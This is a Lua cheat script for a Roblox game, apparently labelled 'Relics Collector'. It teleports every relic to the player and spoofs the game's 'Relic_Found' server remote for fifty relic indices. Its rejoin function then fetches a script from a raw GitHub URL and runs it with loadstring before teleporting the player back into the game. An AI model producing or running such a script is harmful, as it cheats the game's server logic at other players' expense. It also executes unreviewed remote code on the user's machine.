local player = game.Players.LocalPlayer
local HRP = player.Character:WaitForChild("HumanoidRootPart")
local Relics = workspace.__THINGS.Relics

player.Character.HumanoidRootPart.Anchored = true
game.StarterGui:SetCore("SendNotification", {
    Title = "Relics Collector";
    Text = "Putting Your Character On Anchored!";
    Duration = 5;
})

game.StarterGui:SetCore("SendNotification", {
    Title = "Relics Collector";
    Text = "Collecting All Relics";
    Duration = 5;
})

local function teleportRelics()
    for _, relic in ipairs(Relics:GetChildren()) do
        if relic:IsA("BasePart") then
            relic.CFrame = HRP.CFrame
        end
    end
end

local function relicsRemote()
    for i = 1, 50 do
        local args = {
            [1] = i
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Relic_Found"):InvokeServer(unpack(args))
    end
end

local function rejoinFunction()
    wait(30)

    game.StarterGui:SetCore("SendNotification", {
        Title = "Relics Collector";
        Text = "All Relics are collected!";
        Duration = 5;
    })

    wait(5)

    local success, errorMessage = pcall(function()
        local script = game:HttpGet("https://raw.githubusercontent.com/RSenix3/Universal/refs/heads/main/FTHRV2")
        loadstring(script)()
    end)

    if not success then
        game.StarterGui:SetCore("SendNotification", {
            Title = "Error";
            Text = "Failed to load script: " .. errorMessage;
            Duration = 5;
        })
    end

    game:GetService("TeleportService"):Teleport(game.PlaceId, player)
end

teleportRelics()
relicsRemote()
rejoinFunction()
